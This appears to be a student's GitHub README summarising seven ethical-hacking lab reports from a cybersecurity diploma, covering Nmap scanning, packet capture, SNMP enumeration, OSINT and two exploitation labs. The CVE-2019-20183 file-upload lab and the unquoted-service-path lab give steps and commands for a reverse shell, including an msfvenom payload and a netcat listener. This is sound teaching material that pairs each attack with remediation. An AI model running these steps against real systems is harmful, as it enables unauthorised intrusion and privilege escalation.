# Ethical Hacking & Information Security Lab Reports

![Security](https://img.shields.io/badge/Security-Ethical_Hacking-red?style=flat-square)
![Level](https://img.shields.io/badge/Level-5_Diploma-blue?style=flat-square)
![Tools](https://img.shields.io/badge/Tools-Nmap_|_Burp_Suite_|_Wireshark_|_Metasploit-darkgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-In_Progress-yellow?style=flat-square)

A collection of hands-on ethical hacking and information security assessment reports completed as part of the **Level 5 Diploma in Computing with Cybersecurity** (NCC Education). Each lab was conducted in an **isolated, authorised academic environment**.

---

## Lab Index

| # | Lab | Key Techniques | Tools Used | Status |
|---|-----|---------------|------------|--------|
| 01 | [Nmap Network Reconnaissance](labs/nmap-network-scan/lab-report-nmap.md) | Port scanning, service/OS fingerprinting | Nmap | ⏳ Screenshots pending |
| 02 | [Wireshark Traffic Analysis](lab-02-wireshark-traffic-analysis.md) | Packet capture, protocol analysis, credential interception | Wireshark, tcpdump | ⏳ Screenshots pending |
| 03 | [CVE-2019-20183 Exploitation](#03-cve-2019-20183--unrestricted-file-upload--rce) | File upload bypass, RCE, CVSS scoring | Burp Suite, msfvenom, Netcat | 📄 Report only |
| 04 | [SNMP Enumeration](#04-snmp-enumeration-port-161) | Service enumeration, MIB walking | Nmap, onesixtyone, snmpwalk | 📄 Report only |
| 05 | [FTP Forensics & Packet Analysis](#05-ftp-forensics--packet-analysis) | Credential capture, protocol analysis | Wireshark, tcpdump | 📄 Report only |
| 06 | [Unquoted Service Path Privilege Escalation](#06-unquoted-service-path-privilege-escalation) | Windows privesc, service exploitation | WMIC, msfvenom, accesschk | 📄 Report only |
| 07 | [OSINT & Footprinting](#07-osint--footprinting) | Passive recon, metadata extraction | theHarvester, Shodan, Maltego, FOCA | 📄 Report only |

---

## 01. Nmap Network Reconnaissance

**Objective:** Conduct structured network reconnaissance against a Kali Linux localhost and a QEMU virtual gateway using Nmap to identify open ports, enumerate service versions, fingerprint operating systems, and interpret findings in a security context.

**Techniques:**
- Progressive scanning: basic → version detection → OS fingerprinting → aggressive
- Service version disclosure analysis
- Attack surface assessment

**Tools:** `Nmap 7.98`

**Key Findings:**
- Port 22 (OpenSSH 10.2p1) identified on localhost once SSH started
- Gateway (10.0.2.2) exposed ports 135, 445, 902, 912, 5357
- Port 445 (SMB) flagged as highest risk — EternalBlue attack vector

**Security+ Mapping:** Domain 4.1 — Network Security Controls, Domain 3.3 — Vulnerability Scanning

📄 [Full Lab Report](labs/nmap-network-scan/lab-report-nmap.md)

---

## 02. Wireshark Traffic Analysis

**Objective:** Capture and analyse live network traffic using Wireshark to understand protocol behaviour, identify cleartext data transmission, and practise packet-level investigation techniques.

**Techniques:**
- TCP three-way handshake analysis
- DNS query/response inspection
- HTTP POST credential capture
- Protocol statistics and conversation analysis

**Tools:** `Wireshark 4.x` `Python http.server`

**Key Findings:**
- HTTP POST credentials captured in plaintext — no encryption
- DNS queries fully visible to any on-path observer
- Demonstrates why HTTPS and DoH/DoT are mandatory

**Security+ Mapping:** Domain 3 — Network Security & Protocol Analysis

📄 [Full Lab Report](lab-02-wireshark-traffic-analysis.md)

---

## 03. CVE-2019-20183 — Unrestricted File Upload & RCE

**CVE:** CVE-2019-20183 | **CVSS v3.1:** 7.2 (High) | **System:** Employee Records System 1.0

**Vulnerability:** Client-side only file extension validation in `uploadimage.php`. Server performs no MIME type checking, allowing arbitrary PHP webshell uploads.

**Exploitation Steps:**
```
1. Intercept upload request with Burp Suite
2. Modify Content-Type header to bypass client-side JS validation
3. Upload PHP reverse shell with allowed extension
4. Navigate to upload directory to trigger execution
5. Catch reverse shell: nc -lvnp 4444
```

**Remediation:**
- Implement server-side allowlist for file extensions
- Store uploads outside web root with randomised filenames
- Add MIME type validation server-side
- Re-test after patching to confirm fix

**Security+ Mapping:** Domain 2 — Vulnerabilities & Application Security

---

## 04. SNMP Enumeration (Port 161)

**Objective:** Enumerate SNMP-enabled devices to extract system information, running processes, and network configuration.

**Techniques:**
- SNMP v1/v2c community string brute force
- MIB (Management Information Base) walking
- Network topology discovery via SNMP

**Commands Used:**
```bash
# Discover SNMP hosts
nmap -sU -p 161 --open 192.168.1.0/24

# Brute force community strings
onesixtyone -c community_strings.txt 192.168.1.x

# Walk MIB tree
snmpwalk -v2c -c public 192.168.1.x
```

**Key Findings:**
- Default community string `public` exposed full system MIB
- Running processes, installed software, and routing table extracted
- No authentication or encryption on SNMP v1/v2c

**Remediation:** Upgrade to SNMPv3 with AuthPriv mode; restrict SNMP access to management VLAN

**Security+ Mapping:** Domain 3 — Network Security & Enumeration

---

## 05. FTP Forensics & Packet Analysis

**Objective:** Capture and analyse FTP traffic to demonstrate credential exposure and propose secure alternatives.

**Techniques:**
- Packet capture on FTP sessions (port 21)
- Credential extraction from cleartext traffic
- Protocol comparison: FTP vs FTPS vs SFTP

**Commands Used:**
```bash
# Capture FTP traffic
tcpdump -i eth0 port 21 -w ftp_capture.pcap

# Filter in Wireshark
ftp.request.command == "USER" || ftp.request.command == "PASS"
```

**Key Findings:**
- Username and password transmitted in plaintext, captured in <3 seconds
- Directory structure and file names fully visible in packet stream
- No encryption at any point in the FTP session

**Remediation:** Replace FTP with SFTP (port 22) or FTPS (port 990); enforce key-based authentication

**Security+ Mapping:** Domain 3 — Protocol Security & Network Analysis

---

## 06. Unquoted Service Path Privilege Escalation

**Objective:** Exploit an unquoted service path vulnerability on a Windows system to escalate privileges from standard user to SYSTEM.

**Vulnerability:** Windows service binary paths containing spaces without quotes allow attackers to place a malicious executable at an earlier path segment.

**Exploitation Steps:**
```
1. Enumerate vulnerable services
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

2. Verify write permissions on vulnerable path
   accesschk.exe -wvu "C:\Program Files\Vulnerable App"

3. Place malicious payload at exploitable path
   msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > payload.exe

4. Restart service and catch SYSTEM shell
```

**Key Findings:**
- Achieved SYSTEM-level access from standard user account
- Service restart triggered payload execution without user interaction
- Vulnerability existed due to improper path quoting in service configuration

**Remediation:** Enclose all service binary paths in quotes; apply principle of least privilege to service accounts

**Security+ Mapping:** Domain 2 — Vulnerability Exploitation & Windows Security

---

## 07. OSINT & Footprinting

**Objective:** Conduct passive reconnaissance against a target organisation to map attack surface without direct interaction.

**Techniques:**
- Email harvesting and employee enumeration
- DNS and subdomain enumeration
- Metadata extraction from public documents
- Shodan IoT/device discovery

**Tools & Commands:**
```bash
# Email and subdomain harvesting
theHarvester -d target.com -b google,linkedin,bing

# Shodan device discovery
shodan search org:"Target Organisation"

# DNS enumeration
nslookup -type=ANY target.com
```

**Key Findings:**
- 14 employee email addresses harvested from public sources
- 3 exposed subdomains identified including a staging environment
- PDF metadata revealed internal usernames and software versions
- Shodan identified 2 internet-facing devices with default credentials

**Remediation:** Strip metadata from public documents; disable unnecessary subdomains; change default credentials; implement email address obfuscation

**Security+ Mapping:** Domain 2 — Threat Intelligence, OSINT & Reconnaissance

---

## Skills Demonstrated

| Category | Skills |
|----------|--------|
| Offensive Security | CVE exploitation, privilege escalation, web app attacks, social engineering recon |
| Network Analysis | Packet capture, protocol analysis, traffic filtering, credential extraction |
| OSINT | Passive recon, metadata analysis, email harvesting, attack surface mapping |
| Malware Analysis | Static/dynamic analysis, IOC extraction, memory forensics, sandbox analysis |
| Remediation | Security controls, patch management, hardening recommendations |

---

## Environment & Ethics

> All labs conducted in **controlled, isolated academic environments** using purpose-built vulnerable VMs and authorised targets only. No real-world systems were targeted or harmed. All work completed under NCC Education academic guidelines.

---

## Related Repositories

- [Network Security Defence](https://github.com/cyr6x/network-security-defence) — LAN design, DMZ architecture, DDoS mitigation
- [CCorp SIRTS](https://github.com/cyr6x/ccorp-sirts) — Security Incident Response & Ticketing System
- [SY0-701 Exam Simulator](https://github.com/cyr6x/sy0-701-simulator) — CompTIA Security+ practice platform
- [Password Cracking Lab](https://github.com/cyr6x/password-cracking-lab) — Hashcat MD5/SHA1/NTLM cracking
- [Burp Suite Web Testing Lab](https://github.com/cyr6x/burpsuite-web-testing-lab) — SQLi & XSS exploitation
- [Metasploit Exploitation Lab](https://github.com/cyr6x/metasploit-exploitation-lab) — vsftpd backdoor exploitation
- [Wireshark Traffic Analysis](https://github.com/cyr6x/wireshark-traffic-analysis) — Malicious traffic PCAP analysis
